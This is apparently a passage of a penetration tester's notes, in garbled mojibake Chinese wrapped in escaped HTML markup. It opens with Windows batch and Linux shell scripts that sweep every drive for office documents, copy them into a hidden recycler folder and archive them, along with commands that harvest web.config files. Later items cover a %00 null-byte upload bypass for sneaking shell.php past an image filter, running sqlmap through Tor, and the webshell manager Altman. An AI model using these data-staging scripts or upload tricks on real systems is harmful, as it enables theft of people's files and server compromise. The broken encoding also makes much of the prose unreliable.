   find /r ç›®å½•å %å˜é‡å in (åŒ¹é…æ¨¡å¼1,åŒ¹é…æ¨¡å¼2) do å‘½ä»¤  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;ge&quot;&gt;*.xlsx,*&lt;/span&gt;.txt) do copy &quot;%i&quot; f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
   c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ar.exe a -k -r -s -m1 c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.rar c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   7z.exe a -t7z -p123456 c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   del /f/q folder
   rar a /v20m /m0 newfilename web.rar
   windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
   windows batæ‰¹å¤„ç†forç”¨æ³•:http://blog.csdn.net/wh_19910525/article/details/7912440&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   windowsæ‰¾æ–‡ä»¶å‘½ä»¤:
   for /f %j in (&#39;dir /b /s &quot;c:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SCOMCTL.O?X&quot;&#39;) do (echo %j)
    windowsæ‰¾æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²å‘½ä»¤:
   findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt

   powershell:dir â€“r | select-string &quot;root&quot;

   windowsæ‰“åŒ…(7z)å‘½ä»¤:1.bat
   ---------------content of 1.bat--------------------------
    @echo off
    goto :main
    è¿™æ˜¯æ³¨é‡Š:(for /f &quot;delims=&quot;çš„ä½œç”¨ä¸ºå–æ¶ˆé»˜è®¤çš„ä»¥ç©ºæ ¼ç­‰ç¬¦å·ä½œä¸ºåˆ†å‰²ç¬¦
    dir /s å®ç°äº†linuxä¸­çš„findåŠŸèƒ½,for /r path %%i in (web.conf?g) do ... ä¹Ÿå¯ä»¥å®ç°findåŠŸèƒ½,ä½†æ˜¯è‡ªå·±å®ç°æ—¶å‘ç°for /r path ...ä¸­çš„pathåªèƒ½æ˜¯ä¸€ä¸ªå…·ä½“è·¯å¾„,ä¸èƒ½æ˜¯å˜é‡,è¿™æ ·å°±ä¸èƒ½éå†å…¨éƒ¨ç£ç›˜äº†)
    :main
    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
    rd /s/q c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    md c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo  å½“å‰ç¡¬ç›˜çš„åˆ†åŒºæœ‰: 
    for %%i in (%str%) do (
    if exist %%i: (echo %%i:
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.doc&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; tmp.txt
    )
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.docx&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.pdf&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.txt&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xls&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xlsx&quot;&#39;) do (
    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
    )
    
    
    )
    )
    
    7z a -t7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
    ------------------end--------------------------------&lt;span class=&quot;sb&quot;&gt;

    linuxæ‰“åŒ…å‘½ä»¤:1.sh(attention:without &quot;&amp;amp;&amp;amp; echo ok&quot;,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
    -----------------content of 1.sh--------------------
    mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
    --------------------end-----------------------------
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
&lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
&lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;pythonä¸­å•å¼•å·,åŒå¼•å·,ä¸‰å¼•å·http://blog.csdn.net/caianye/article/details/6638183       
&lt;span class=&quot;p&quot;&gt;45.&lt;/span&gt;os.system(&#39;&#39;&#39;python %s &amp;gt;&amp;gt; &quot;out_log.txt&quot;&#39;&#39;&#39; % exp_path) &quot;&amp;gt;&amp;gt;&quot; instead of &quot;open(file,&quot;a+&quot;) fp.write(str)&quot; in py2 or py3
&lt;span class=&quot;p&quot;&gt;46.&lt;/span&gt;tips:  
   msfå¿…ä¸å¯å°‘burpsuite/fiddlerå¿…ä¸å¯å°‘python,ruby,shell,perlå¿…ä¸å¯å°‘,ä¸ä¼šç¼–ç¨‹è¿˜æ˜¯åˆ«ç©äº†.
   c/c++/javaèƒ½çœ‹æ‡‚å†™å°ä¸œè¥¿,è¿™å‡ ä¸ªå¾—ç†Ÿç»ƒnmap,sqlmap,niktoidaå¸¸å¤‡dropbox,evernoteå¸¸å¤‡è¿˜æœ‰å•¥å‘¢?
   æˆå½¢çš„å·¥å…·åªèƒ½ç”¨äºé€šç”¨æ£€æµ‹,é’ˆå¯¹å…·ä½“å¯¹è±¡,è¿˜éœ€è¦å†™äº›è‡ªå·±çš„å·¥å…·,å¦å¤–å‡†å¤‡äº›æœ‰é’ˆå¯¹æ€§çš„åŸºç¡€åº“,å­—å…¸å•¥çš„,ç»å¸¸å¹²è¿™ä¸ªéƒ½çŸ¥é“å…ˆæƒ³åˆ°è¿™äº›,ç¨åå†è¡¥å……,å†ç´§å¼ å¹²æ´»ä¸­â€¦â€¦.
&lt;span class=&quot;p&quot;&gt;47.&lt;/span&gt;google-chrome-stable on kali linux2.0
   adding --user-data-dir
   and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox
&lt;span class=&quot;p&quot;&gt;48.&lt;/span&gt;sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
   sqlmap --tor --tor-type=socks5 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;--tor-port=9050&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; --check-tor
   sqlmap --proxy=socks5://127.0.0.1:9050
   sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass
&lt;span class=&quot;p&quot;&gt;49.&lt;/span&gt;torçš„ç¬”è®°:
   1&amp;gt;apt-get install torå®‰è£…çš„toré»˜è®¤ç«¯å£æ˜¯9050,å¼€æœºè‡ªå¯åŠ¨tor:vim /etc/rc.local,åœ¨exit 0å‰åŠ ä¸Šservice tor start,å’Œproxychainsæ­é…ä½¿ç”¨æ—¶è®¾ç½®proxychains.confé‡Œé¢çš„ç«¯å£ä¸º9050
   2&amp;gt;Tor-Browseræ´‹è‘±æµè§ˆå™¨è‡ªå¸¦tor,æ¯æ¬¡å¯åŠ¨tor-browseræ—¶,å®ƒä¼šå¯åŠ¨å®ƒè‡ªå¸¦çš„tor,è¯¥toré»˜è®¤ç«¯å£æ˜¯9150(è€ç‰ˆæœ¬çš„æ˜¯9050)
   3&amp;gt;1ä¸­çš„torå’Œ2ä¸­çš„toråŠŸèƒ½å®Œå…¨ä¸€æ ·,proxychains firefoxç­‰ç¨‹åºæ—¶å¯¹åº”çš„proxychains.confé‡Œé¢çš„ç«¯å£ä¸º9050,å¯åŠ¨tor-browseræµè§ˆå™¨åå¯ç”¨ä¹Ÿå¯å°†proxychains.confä¸­ç«¯å£æ”¹ä¸º9150,ä½†tor-browserå…³é—­åproxychainsè¿™æ ·çš„ä»£ç†è®¾ç½®ä¼šå¤±æ•ˆ.
&lt;span class=&quot;p&quot;&gt;50.&lt;/span&gt;Python Unicodeä¸ä¸­æ–‡å¤„ç†:http://my.oschina.net/u/201886/blog/64692
&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;shadow copyç¥å™¨,å¯ä»¥å¤åˆ¶ä½¿ç”¨ä¸­çš„æ–‡ä»¶,å¯æ‹·è´æ•°æ®åº“
&lt;span class=&quot;p&quot;&gt;52.&lt;/span&gt;phpä¸­çš„header()å‡½æ•° http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
&lt;span class=&quot;p&quot;&gt;53.&lt;/span&gt;phpä¸­{}çš„åŠŸèƒ½ http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
&lt;span class=&quot;p&quot;&gt;54.&lt;/span&gt;phpä¸Šä¼ ä¸­%00æˆªæ–­çš„ç†è§£:
   pythonè„šæœ¬ä¸­:
   def hex_to_asc(ch):
       return &#39;{:c}&#39;.format(int(float.fromhex(ch)))

   for i in range(100):
       s = &#39;%02d&#39; % i
       print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
   å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœ:
   s:00,hex_to_asc(s):NULL
   s:01,hex_to_asc(s):
   s:02,hex_to_asc(s):
   ...
   s:29,hex_to_asc(s):)
   s:30,hex_to_asc(s):0
   s:31,hex_to_asc(s):1
   s:32,hex_to_asc(s):2
   s:33,hex_to_asc(s):3
   s:34,hex_to_asc(s):4
   s:35,hex_to_asc(s):5
   s:36,hex_to_asc(s):6
   s:37,hex_to_asc(s):7
   s:38,hex_to_asc(s):8
   s:39,hex_to_asc(s):9
   s:40,hex_to_asc(s):@
   s:41,hex_to_asc(s):A
   s:42,hex_to_asc(s):B
   s:43,hex_to_asc(s):C
   s:44,hex_to_asc(s):D
   s:45,hex_to_asc(s):E
   s:46,hex_to_asc(s):F
   s:47,hex_to_asc(s):G
   s:48,hex_to_asc(s):H
   s:49,hex_to_asc(s):I
   s:50,hex_to_asc(s):P
   s:51,hex_to_asc(s):Q
   s:52,hex_to_asc(s):R
   s:53,hex_to_asc(s):S
   s:54,hex_to_asc(s):T
   s:55,hex_to_asc(s):U
   s:56,hex_to_asc(s):V
   s:57,hex_to_asc(s):W
   s:58,hex_to_asc(s):X
   s:59,hex_to_asc(s):Y
   s:60,hex_to_asc(s):&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;
   s:61,hex_to_asc(s):a
   s:62,hex_to_asc(s):b
   asciiç å¯¹ç…§è¡¨ä¸­æƒ…å†µ:
   æ ‡å‡†Iè¡¨:
   bin          dec          hex          ç¼©å†™/å­—ç¬¦                 è§£é‡Š
   0000 0000    0            00           NUL(null)                ç©ºå­—ç¬¦
   0000 0001    1            01           SOH(start of headline)   æ ‡é¢˜å¼€å§‹
   ...
   0010 0000    32           20           (space)                  ç©ºæ ¼
   00110000     48           30           0
   01000001     65           41           A
   01100001     97           61           a
   åœ¨è®¡ç®—æœºä¸­,æ‰€æœ‰çš„æ•°æ®åœ¨å­˜å‚¨å’Œè¿ç®—æ—¶éƒ½è¦ä½¿ç”¨äºŒè¿›åˆ¶æ•°è¡¨ç¤º(å› ä¸ºè®¡ç®—æœºç”¨é«˜ç”µå¹³å’Œä½ç”µå¹³åˆ†åˆ«è¡¨ç¤º1å’Œ0),ä¾‹å¦‚,åƒaã€bã€cã€dè¿™æ ·çš„52ä¸ªå­—æ¯(åŒ…æ‹¬å¤§å†™)ã€ä»¥åŠ0ã€1ç­‰æ•°å­—è¿˜æœ‰ä¸€äº›å¸¸ç”¨çš„ç¬¦å·(ä¾‹å¦‚&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;ã€#ã€@ç­‰)åœ¨è®¡ç®—æœºä¸­å­˜å‚¨æ—¶ä¹Ÿè¦ä½¿ç”¨äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤º,è€Œå…·ä½“ç”¨å“ªäº›äºŒè¿›åˆ¶æ•°å­—è¡¨ç¤ºå“ªä¸ªç¬¦å·,å½“ç„¶æ¯ä¸ªäººéƒ½å¯ä»¥çº¦å®šè‡ªå·±çš„ä¸€å¥—(è¿™å°±å«ç¼–ç ),è€Œå¤§å®¶å¦‚æœè¦æƒ³äº’ç›¸é€šä¿¡è€Œä¸é€ æˆæ··ä¹±,é‚£ä¹ˆå¤§å®¶å°±å¿…é¡»ä½¿ç”¨ç›¸åŒçš„ç¼–ç è§„åˆ™,äºæ˜¯ç¾å›½æœ‰å…³çš„æ ‡å‡†åŒ–ç»„ç»‡å°±å‡ºå°äº†ASCIIç¼–ç ,ç»Ÿä¸€è§„å®šäº†ä¸Šè¿°å¸¸ç”¨ç¬¦å·ç”¨å“ªäº›äºŒè¿›åˆ¶æ•°æ¥è¡¨ç¤º.
   ä¸ªäººç†è§£æˆasciiç åªæ˜¯ä¸€ä¸ªå¯¹ç…§å…³ç³»,å¦‚æœç¡¬è¯´asciiæ˜¯å¤šå°‘,åˆ™æŠŠasciiç å€¼å½“ä½œ&quot;ç¼©å†™/å­—ç¬¦&quot;ä¸€æ å¯¹åº”çš„å€¼,
   å³äºŒè¿›åˆ¶(01000001)å¯¹åº”äºŒè¿›åˆ¶(65)å¯¹åº”åå…­è¿›åˆ¶(41),è€Œå®ƒä»¬å¯¹åº”çš„asciiç ä¸ºé”®ç›˜ä¸Šçš„å¯æ§å­—ç¬¦&quot;A&quot;,
   æ‰€ä»¥%00æˆªæ–­æ—¶çš„ä¸‹é¢ä¸¤ç§æƒ…å†µ:
&lt;span class=&quot;p&quot;&gt;   1.&lt;/span&gt;åœ¨urlä¸­åŠ å…¥%00,å¦‚http://xxoo/shell.php%00.jpg
&lt;span class=&quot;p&quot;&gt;   2.&lt;/span&gt;åœ¨burpsuiteä¸­ç”¨burpè‡ªå¸¦çš„åå…­è¿›åˆ¶ç¼–è¾‘å·¥å…·å°†&quot;shell.php .jpg&quot;(ä¸­é—´æœ‰ç©ºæ ¼)ä¸­çš„ç©ºæ ¼ç”±20æ”¹æˆ00
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   åœ¨1ä¸­,urlä¸­çš„%00(å½¢å¦‚%xx),web serverä¼šæŠŠå®ƒå½“ä½œåå…­è¿›åˆ¶å¤„ç†,ç„¶åå°†è¯¥åå…­è¿›åˆ¶æ•°æ®hex(00)&quot;ç¿»è¯‘&quot;æˆç»Ÿä¸€çš„asciiç å€¼&quot;NUL(null)&quot;,å®ç°äº†æˆªæ–­;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   åœ¨2ä¸­,burpsuiteç”¨burpè‡ªå¸¦çš„åå…­è¿›åˆ¶ç¼–è¾‘å·¥å…·å°†&quot;shell.php .jpg&quot;(ä¸­é—´æœ‰ç©ºæ ¼)ä¸­çš„ç©ºæ ¼ç”±20æ”¹æˆ00,å¦‚æœburpä¸­æœ‰äºŒè¿›åˆ¶ç¼–è¾‘å·¥å…·,
   ä¹Ÿå¯ä»¥å°†&quot;shell.php .jpg&quot;(ä¸­é—´æœ‰ç©ºæ ¼)ä¸­çš„ç©ºæ ¼ç”±000010 0000(é”®ç›˜ä¸Šå¯æ§å­—ç¬¦spaceå¯¹åº”çš„äºŒè¿›åˆ¶)æ”¹æˆ0000 0000(nullå¯¹åº”çš„äºŒè¿›åˆ¶),
   ä¸Šä¼ åˆ°æœåŠ¡å™¨å,æœåŠ¡å™¨ä½œä¸ºä¸€å°è®¡ç®—æœºä¹Ÿä¼šå°†è¯¥å¤„çš„åŸæ¥çš„ç©ºæ ¼ç”±äºè¢«æ”¹æˆæˆªæ–­ç¬¦å&quot;ç¿»è¯‘&quot;æˆnull,å®ç°äº†æˆªæ–­åŠŸèƒ½;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
   æ‰€ä»¥åœ¨ç”¨python(æˆ–å…¶å®ƒè¯­è¨€)ä¸­,è¦æƒ³&quot;å†™å‡º&quot;æˆªæ–­ç¬¦(null),
   ä¹Ÿå°±æ˜¯è¦å†™å‡ºasciiç å€¼çš„NUL(null),ä¹Ÿå°±æ˜¯è¦ç”±hex(åå…­è¿›åˆ¶)ä¸‹çš„
   00å˜æˆasciiç å€¼,è¿™æ˜¯è¯­è¨€å’Œè§£é‡Šå™¨ä»¥åŠè®¡ç®—æœºä¹‹é—´çš„å…³ç³»,æ­£å¦‚ä¸Šé¢çš„pythonè„šæœ¬,
   è€Œphpä¸­:
   --------w3c:
   å®šä¹‰å’Œç”¨æ³•
   chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦.
   ASCII å€¼å¯è¢«æŒ‡å®šä¸ºåè¿›åˆ¶å€¼ã€å…«è¿›åˆ¶å€¼æˆ–åå…­è¿›åˆ¶å€¼.å…«è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0,è€Œåå…­è¿›åˆ¶å€¼è¢«å®šä¹‰ä¸ºå¸¦å‰ç½® 0x. 
   --------w3c  (w3cè¿™é‡Œçš„è¯´æ³•æŠŠasciiå€¼çœ‹ä½œæœ‰ä¸åŒçš„è¿›åˆ¶è¡¨ç¤ºå½¢æ€çš„å„è¿›åˆ¶å€¼)
   å…¶ä¸­chr(61)ä¸º=,chr(061)ä¸º1,chr(0x61)ä¸ºa,chr(128)=chr(0x80),chr(255)=chr(0xff)
   script 1:
   &amp;lt;?php
   for($k=0;$k&amp;lt;=255;$k++)
   {
   $a=&#39;shell.php&#39;.chr($k).&quot;1.jpg&quot;;
   echo &#39;k:&#39;.$k.&#39;   &#39;.&#39;$a:&#39;.$a.&#39;   &#39;.&#39;iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):&#39;.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
   }
   ?&amp;gt;

   å…¶ä¸­iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a)æˆ–æ˜¯iconv(&quot;UTF-8&quot;,&quot;gb2313&quot;,$a)éƒ½ä¼šåœ¨chr(128)åˆ°chr(255)ä¹‹é—´æˆªæ–­,ä½¿ç»“æœä¸º1,è€Œä¸æ˜¯1(some char)2,
   å…¶ä¸­128å’Œ255ä¸ºäºŒè¿›åˆ¶æ•°æ®è¡¨ç¤º,æ­¤å¤„NUL(nul)(chr(0x00))å¹¶ä¸èƒ½æˆªæ–­iconvå‡½æ•°,è€Œæ˜¯chr(128)-chr(255),ä¹Ÿå³chr(0x80)-chr(0xff)æˆªæ–­iconvå‡½æ•°.
   æˆ–è€…ç”¨å¦‚ä¸‹ä»£ç ä¸­hex2ascå‡½æ•°:
   script 2:
   &amp;lt;?php
    
   function asc2hex($str) {  
   return &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;.substr(chunk_split(bin2hex($str), 2, &#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;),0,-2);  
   } &lt;span class=&quot;sb&quot;&gt;

    
&lt;/span&gt;   function hex2asc($str) {  
   $str = join(&#39;&#39;,explode(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&#39;,$str));  
   $len = strlen($str);  
   for ($i=0;$i&amp;lt;$len;$i+=2) $data.=chr(hexdec(substr($str,$i,2)));  
   return $data;  
   }  &lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   for($k=0;$k&amp;lt;256;$k++)
   {
   $a=sprintf(&quot;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;%02x&quot;,$k);
   echo &#39;$k:&#39;.$k.&#39; &#39;;
   echo &#39;$a:&#39;.$a.&#39; &#39;;
   echo &#39;hex2asc($a):&#39;.hex2asc($a);
   $file_name=&quot;shell.php&quot;.hex2asc($a).&quot;1.jpg&quot;;
   echo &#39;$file_name:&#39;.$file_name.&#39;  &#39;;
   $file_name=iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name);
   echo &#39;iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;,$file_name):&#39;.$file_name.&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
   }
   /&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
   echo hex2asc(&#39;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00&#39;);
   &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/
   ?&amp;gt;
   ç›¸åŒæƒ…å†µä¸‹çš„pythonè„šæœ¬ä¸º:
   def hex_to_asc(ch):
    return &#39;{:c}&#39;.format(int(float.fromhex(ch)))

   for i in range(256):
    s = &#39;%02x&#39; % i
    print &quot;s:&quot;,s,&quot;    &quot;,
    print &quot;hex_to_asc(s):&quot;,hex_to_asc(s)
    # print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
&lt;span class=&quot;p&quot;&gt;55.&lt;/span&gt;htmlspecialcharsçš„ä½œç”¨æ˜¯æŠŠ:
   &amp;amp; (å’Œå·) æˆä¸º &amp;amp;
   &quot; (åŒå¼•å·) æˆä¸º &quot;
   &#39; (å•å¼•å·) æˆä¸º &#39;
   &amp;lt; (å°äº) æˆä¸º &amp;lt;
&lt;span class=&quot;gt&quot;&gt;   &amp;gt; (å¤§äº) æˆä¸º &amp;gt;   &lt;/span&gt;
   è¾“å‡ºçš„æ—¶å€™ä¸éœ€è¦ç‰¹æ®Šå¤„ç† æµè§ˆå™¨ ä¼šæŠŠè¿™äº›æ ‡ç­¾è¿˜åŸçš„
&lt;span class=&quot;p&quot;&gt;56.&lt;/span&gt;linuxå‘½ä»¤è¡Œä¸‹ç»“æŸfirefoxè¿›ç¨‹:
   ps -aux | grep firefox | awk &#39;{if($11==&quot;firefox&quot;) print $2}&#39;| xargs kill -9
   pkill firefox
&lt;span class=&quot;p&quot;&gt;57.&lt;/span&gt;èœåˆ€æ›¿ä»£å·¥å…·:Altman
   http://www.i0day.com/1725.html
   https://github.com/keepwn/Altman
&lt;span class=&quot;p&quot;&gt;58.&lt;/span&gt;Pidgin my irc client on linux http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
&lt;span class=&quot;p&quot;&gt;59.&lt;/span&gt;dig mx domain(without www)
&lt;span class=&quot;p&quot;&gt;60.&lt;/span&gt;pwntool:https://www.91ri.org/14382.html
&lt;span class=&quot;p&quot;&gt;61.&lt;/span&gt;vimä»¥åå…­è¿›åˆ¶ç¼–è¾‘æ–‡ä»¶:%!xxd
       :%!xxd    ---&amp;gt;   :%!xxd -r    ---&amp;gt;    :wq
       å¦‚æœå¤±è´¥åˆ™ç”¨hexeditç¼–è¾‘
           ctrl+X:save and exit
   vimå¯¹æ¯”ä¸¤ä¸ªæ–‡ä»¶:vim -d 1.txt 2.txt
   vimè‡ªåŠ¨ä¿å­˜æœ‰ç”¨ç‰ˆæœ¬ç­”æ¡ˆ(ç›¸å½“äºesc/jkå®ç°ä¿å­˜åŠŸèƒ½):au InsertLeave &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; write
